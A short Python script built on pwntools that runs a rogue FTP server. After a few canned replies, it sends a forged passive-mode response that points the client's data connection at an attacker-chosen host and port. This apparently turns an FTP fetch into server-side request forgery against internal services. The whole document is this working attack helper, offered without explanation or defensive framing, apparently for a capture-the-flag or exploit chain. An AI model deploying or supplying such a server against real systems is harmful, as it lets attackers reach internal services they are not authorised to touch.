from pwn import listen

# https://www.serv-u.com/resources/tutorial/pasv-response-epsv-port-pbsz-rein-ftp-command#:~:text=(p1%20*%20256)%20%2B%20p2%20%3D%20data%20port


def handle_ftp(lport, rhost: str, rport):
    rhost = rhost.replace(".", ",")
    p1, p2 = divmod(rport, 256)
    while True:
        lst = listen(lport)
        try:
            c = lst.wait_for_connection()
            c.send(b'220 OK\n')
            c.recvline()
            c.send(b'220 OK\n')
            c.recvline()
            c.send(b'220 OK\n')
            c.recvline()
            c.send(
                f'227 Entering Passive Mode ({rhost},{p1},{p2})\n'.encode())
            c.recvline()
            c.send(b'200 MODE set to I\n')
            c.recvline()
            c.send(b'150 Opening BINARY mode data connection\n')
            c.send(b'226 Transfer Complete\n')
            c.recvline()
            c.send(b'200 OK\n')
            c.close()
        except Exception as e:
            print(e)
